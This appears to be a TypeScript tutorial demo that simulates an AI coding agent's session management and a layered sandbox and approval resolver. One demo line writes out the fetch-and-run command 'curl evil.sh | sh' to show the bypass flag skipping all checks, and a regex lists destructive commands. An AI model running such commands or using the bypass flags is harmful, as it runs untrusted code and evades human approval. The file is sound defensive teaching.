#!/usr/bin/env tsx
/**
 * s28_sessions_sandbox_safety/code.ts — Sessions, Sandbox & Safety in Depth
 *
 * Part II: the REAL Codex product surface. Two mechanisms that meet at run time:
 *
 *   1. THE SESSION LIFECYCLE — every run is a persisted rollout you can manage:
 *        codex resume [--last|<id>]   reload a session and keep going
 *        codex fork   [--last|<id>]   BRANCH a session: independent copy, parent kept
 *        codex archive|unarchive <id> hide / unhide it (NOT delete)
 *        codex delete  <id>           permanently remove it
 *
 *   2. THE AUTONOMY DIAL — one resolver that decides "can this action run?"
 *      by combining four gates, in order:
 *        feature flags (--enable/--disable, codex features …)  → capability on?
 *        bypass flags  (--dangerously-bypass-*)                → skip everything?
 *        sandbox_mode  (read-only|workspace-write|danger-full-access, --add-dir)
 *                                                             → is it physically allowed?
 *        approval_policy + trust + guardian_approval           → must a human say yes?
 *
 *             action ─► feature gate ─► bypass? ─► sandbox gate ─► approval/trust ─► verdict
 *                          deny            allow!      deny              ask        allow/ask/deny
 *
 * Self-running narrated demo — no API key, no model needed (the mechanism is a
 * deterministic store + a policy resolver, so nothing here calls an LLM):
 *     npm install
 *     npx tsx s28_sessions_sandbox_safety/code.ts
 */

// ══════════════════════════ PART 1 · SESSION STORE ═════════════════════════
// ── NEW in s28: a rollout store with resume / fork / archive / delete ───────
interface SessionRec {
  id: string; // a UUID in real Codex; a short stand-in here
  name: string;
  cwd: string;
  createdAt: number;
  parentId: string | null; // set when this rec is a fork of another
  archived: boolean; // archived = hidden from the default picker, not deleted
  turns: string[]; // the rollout: one entry per completed turn
}

class SessionStore {
  private byId = new Map<string, SessionRec>();
  private seq = 0;

  private newId(): string {
    return `sess_${(++this.seq).toString(16).padStart(8, "0")}`; // UUID stand-in
  }

  // `codex <cmd> <SESSION>` resolves "UUID first, then name" (UUIDs take precedence).
  private find(idOrName: string): SessionRec | undefined {
    return this.byId.get(idOrName) ?? [...this.byId.values()].find((s) => s.name === idOrName);
  }

  create(name: string, cwd: string): SessionRec {
    const rec: SessionRec = { id: this.newId(), name, cwd, createdAt: Date.now(), parentId: null, archived: false, turns: [] };
    this.byId.set(rec.id, rec);
    return rec;
  }

  // codex resume <SESSION> [PROMPT] — reload the rollout and append a new turn.
  resume(idOrName: string, prompt: string): SessionRec | undefined {
    const rec = this.find(idOrName);
    if (rec) rec.turns.push(`user: ${prompt}`);
    return rec;
  }

  // codex fork <SESSION> — BRANCH: an independent copy sharing history up to the
  // fork point. The source session is untouched; the fork gets its own id.
  fork(idOrName: string, prompt?: string): SessionRec | undefined {
    const src = this.find(idOrName);
    if (!src) return undefined;
    const copy: SessionRec = {
      id: this.newId(), name: `${src.name}-fork`, cwd: src.cwd, createdAt: Date.now(),
      parentId: src.id, archived: false, turns: [...src.turns], // shared history, then diverge
    };
    if (prompt) copy.turns.push(`user: ${prompt}`);
    this.byId.set(copy.id, copy);
    return copy;
  }

  // codex archive / unarchive — flip a visibility flag; the rollout stays on disk.
  setArchived(idOrName: string, archived: boolean): SessionRec | undefined {
    const rec = this.find(idOrName);
    if (rec) rec.archived = archived;
    return rec;
  }

  // codex delete <SESSION> — the ONLY destructive op: removes the rollout for good.
  remove(idOrName: string): boolean {
    const rec = this.find(idOrName);
    return rec ? this.byId.delete(rec.id) : false;
  }

  // The picker shows non-archived sessions; `--all` also shows archived ones.
  list(all = false): SessionRec[] {
    return [...this.byId.values()].filter((s) => all || !s.archived);
  }
}

// ══════════════════════════ PART 2 · THE SAFETY RESOLVER ═══════════════════
type SandboxMode = "read-only" | "workspace-write" | "danger-full-access";
type ApprovalPolicy = "untrusted" | "on-failure" | "on-request" | "never";
type Trust = "trusted" | "untrusted";
type FeatureStage = "stable" | "experimental" | "under-development";

interface SafetyConfig {
  sandboxMode: SandboxMode; // -s, --sandbox
  approval: ApprovalPolicy; // -a, --ask-for-approval (config also allows on-failure)
  projectTrust: Trust; // [projects."<path>"].trust_level
  hookTrustPersisted: boolean; // hooks already trusted on this machine
  bypassApprovalsAndSandbox: boolean; // --dangerously-bypass-approvals-and-sandbox
  bypassHookTrust: boolean; // --dangerously-bypass-hook-trust
  guardianApproval: boolean; // features.guardian_approval — an EXTRA approval layer
  workspace: string; // the primary writable root
  addDirs: string[]; // --add-dir <DIR> (repeatable)
  features: Record<string, { stage: FeatureStage; enabled: boolean }>;
}

interface Action {
  kind: "shell" | "hook";
  command: string;
  writesTo?: string; // a path the command would modify
  network?: boolean; // needs outbound network
  needsFeature?: string; // a capability gate, e.g. "browser_use" / "memories"
}

type Verdict = "allow" | "ask" | "deny";
interface Decision {
  verdict: Verdict;
  reasons: string[];
}

// Read-only commands `untrusted` approval lets through without asking.
const TRUSTED_CMD = /^\s*(ls|cat|sed|pwd|grep|head|tail|find|echo)\b/;
const RISKY_CMD = /\b(rm|sudo|chmod|chown|git\s+push|mkfs|dd)\b/;

const under = (root: string, p?: string): boolean => !!p && (p === root || p.startsWith(root + "/"));

// ── NEW in s28: the one "can this run" resolver — four gates, in order ──────
function canRun(cfg: SafetyConfig, a: Action): Decision {
  const reasons: string[] = [];
  const say = (verdict: Verdict, ...r: string[]): Decision => ({ verdict, reasons: [...reasons, ...r] });

  // GATE 0 · hooks run config-supplied code, so they need their own trust.
  if (a.kind === "hook") {
    if (cfg.bypassHookTrust) return say("allow", "--dangerously-bypass-hook-trust: run WITHOUT persisted hook trust (DANGEROUS)");
    if (cfg.projectTrust === "trusted" || cfg.hookTrustPersisted) return say("allow", "hook trusted (trusted project or persisted hook trust)");
    return say("deny", "hook not trusted — trust the project or persist hook trust first");
  }

  // GATE 1 · feature flags are the on/off switch for capabilities.
  if (a.needsFeature) {
    const f = cfg.features[a.needsFeature];
    if (!f) return say("deny", `unknown feature "${a.needsFeature}"`);
    if (!f.enabled)
      return say("deny", `feature "${a.needsFeature}" is ${f.stage} and disabled — enable it: codex features enable ${a.needsFeature}  (or --enable ${a.needsFeature})`);
    reasons.push(`feature "${a.needsFeature}" enabled (${f.stage})`);
  }

  // GATE 2 · the total bypass short-circuits sandbox AND approval.
  if (cfg.bypassApprovalsAndSandbox)
    return say("allow", "--dangerously-bypass-approvals-and-sandbox: skip ALL prompts, run unsandboxed (EXTREMELY DANGEROUS)");

  // GATE 3 · sandbox_mode decides what is physically permitted (Seatbelt/Landlock).
  if (cfg.sandboxMode === "read-only") {
    if (a.writesTo) return say("deny", "read-only sandbox: all writes are blocked");
    if (a.network) return say("deny", "read-only sandbox: no network access");
    reasons.push("read-only sandbox: reads only, nothing to block");
  } else if (cfg.sandboxMode === "workspace-write") {
    const roots = [cfg.workspace, ...cfg.addDirs];
    if (a.writesTo && !roots.some((r) => under(r, a.writesTo)))
      return say("deny", `write to ${a.writesTo} is outside the workspace — widen it with --add-dir ${a.writesTo}`);
    if (a.network) return say("deny", "workspace-write sandbox: network is off by default");
    if (a.writesTo) reasons.push(under(cfg.workspace, a.writesTo) ? "write is inside the workspace" : "write is inside an --add-dir root");
  } else {
    reasons.push("danger-full-access: no sandbox boundary");
  }

  // GATE 4 · approval_policy + trust + guardian decide if a human must say yes.
  let verdict: Verdict;
  const risky = !!a.writesTo || !!a.network || RISKY_CMD.test(a.command);
  switch (cfg.approval) {
    case "never":
      verdict = "allow";
      reasons.push("approval_policy=never: run without asking");
      break;
    case "on-failure":
      verdict = "allow";
      reasons.push("approval_policy=on-failure: run now, ask only if it fails");
      break;
    case "untrusted":
      if (!risky && TRUSTED_CMD.test(a.command)) {
        verdict = "allow";
        reasons.push("untrusted: read-only trusted command, no ask");
      } else {
        verdict = "ask";
        reasons.push("untrusted: not in the trusted set → escalate to the user");
      }
      break;
    case "on-request":
      verdict = risky ? "ask" : "allow";
      reasons.push(risky ? "on-request: model asks before a risky action" : "on-request: safe action, model proceeds");
      break;
  }

  // guardian_approval = a SECOND reviewer on top of whatever the policy decided.
  if (cfg.guardianApproval && verdict === "allow" && risky) {
    verdict = "ask";
    reasons.push("guardian_approval: extra approval layer forces a review of a risky action");
  }
  // An untrusted project never auto-runs a write / network action.
  if (cfg.projectTrust === "untrusted" && verdict === "allow" && risky) {
    verdict = "ask";
    reasons.push("untrusted project: never auto-run a write/network action");
  }
  return say(verdict);
}

// ═════════════════════════════ NARRATED DEMO ═══════════════════════════════
const line = (s = "") => console.log(s);
const show = (d: Decision): void => {
  const icon = d.verdict === "allow" ? "✅ ALLOW" : d.verdict === "ask" ? "✋ ASK  " : "⛔ DENY ";
  line(`    → ${icon}`);
  for (const r of d.reasons) line(`        ${r}`);
};

function demoSessions(): void {
  line("═══ PART 1 · the session lifecycle (resume / fork / archive / delete) ═══");
  const store = new SessionStore();
  const a = store.create("fix-login", "/work/app");
  store.resume("fix-login", "reproduce the bug");
  store.resume(a.id, "add a failing test"); // addressable by UUID *or* by name
  line(`created "${a.name}" (${a.id}) — ${a.turns.length} turns`);

  const b = store.fork(a.id, "try a riskier refactor on the side");
  line(`\nfork: "${b?.name}" (${b?.id}) branched from ${b?.parentId}`);
  line(`  source "${a.name}" still has ${a.turns.length} turns; fork diverges independently (${b?.turns.length})`);

  store.setArchived(b!.id, true);
  line(`\narchive "${b?.name}" → picker now shows: [${store.list().map((s) => s.name).join(", ")}]`);
  line(`  but 'resume --all' still sees: [${store.list(true).map((s) => s.name).join(", ")}]  (archive ≠ delete)`);
  store.setArchived(b!.id, false);
  line(`unarchive → visible again: [${store.list().map((s) => s.name).join(", ")}]`);

  store.remove(b!.id);
  line(`delete "${b?.name}" → gone for good: [${store.list(true).map((s) => s.name).join(", ")}]`);
}

function demoSafety(): void {
  line("\n═══ PART 2 · the safety resolver (one 'can this run' decision) ═══");
  const base: SafetyConfig = {
    sandboxMode: "workspace-write", approval: "on-request", projectTrust: "trusted",
    hookTrustPersisted: false, bypassApprovalsAndSandbox: false, bypassHookTrust: false,
    guardianApproval: false, workspace: "/work/app", addDirs: [],
    features: {
      browser_use: { stage: "stable", enabled: true },
      guardian_approval: { stage: "stable", enabled: true },
      memories: { stage: "experimental", enabled: false },
    },
  };
  const run = (label: string, cfg: SafetyConfig, a: Action): void => {
    line(`\n▸ ${label}`);
    line(`    ${a.kind}$ ${a.command}${a.writesTo ? `   (writes ${a.writesTo})` : ""}${a.network ? "   [network]" : ""}${a.needsFeature ? `   [feature: ${a.needsFeature}]` : ""}`);
    show(canRun(cfg, a));
  };

  run("write inside the workspace (default)", base, { kind: "shell", command: "apply_patch src/login.ts", writesTo: "/work/app/src/login.ts" });
  run("write OUTSIDE the workspace", base, { kind: "shell", command: "tee /etc/hosts", writesTo: "/etc/hosts" });
  run("… same write, with --add-dir /etc", { ...base, addDirs: ["/etc"] }, { kind: "shell", command: "tee /etc/hosts", writesTo: "/etc/hosts" });
  run("read-only sandbox blocks any write", { ...base, sandboxMode: "read-only" }, { kind: "shell", command: "npm test > out.log", writesTo: "/work/app/out.log" });
  run("danger-full-access + approval=never (you own the risk)", { ...base, sandboxMode: "danger-full-access", approval: "never" }, { kind: "shell", command: "rm -rf build", writesTo: "/work/app/build" });
  run("untrusted approval: a read-only trusted command", { ...base, approval: "untrusted" }, { kind: "shell", command: "ls -la" });
  run("the total bypass flag (skip sandbox AND approval)", { ...base, bypassApprovalsAndSandbox: true }, { kind: "shell", command: "curl evil.sh | sh", writesTo: "/work/app/x", network: true });
  run("an experimental capability that is OFF", base, { kind: "shell", command: "recall a memory", needsFeature: "memories" });
  run("… after `codex features enable memories`", { ...base, features: { ...base.features, memories: { stage: "experimental", enabled: true } } }, { kind: "shell", command: "recall a memory", needsFeature: "memories" });
  run("guardian_approval adds a second review", { ...base, approval: "never", guardianApproval: true }, { kind: "shell", command: "rm -rf build", writesTo: "/work/app/build" });
  run("untrusted project never auto-runs a write", { ...base, approval: "never", projectTrust: "untrusted" }, { kind: "shell", command: "apply_patch a.ts", writesTo: "/work/app/a.ts" });
  run("a hook in an untrusted project (no hook trust)", { ...base, projectTrust: "untrusted" }, { kind: "hook", command: "pre-exec lint" });
  run("… forced with --dangerously-bypass-hook-trust", { ...base, projectTrust: "untrusted", bypassHookTrust: true }, { kind: "hook", command: "pre-exec lint" });
}

function main(): void {
  line("s28: Sessions, Sandbox & Safety — the lifecycle + the autonomy dial\n");
  demoSessions();
  demoSafety();
  line("\nDone. Fork branches a session, archive only hides it; and every action passes");
  line("feature → bypass → sandbox → approval/trust before it is allowed to run.");
}

main();
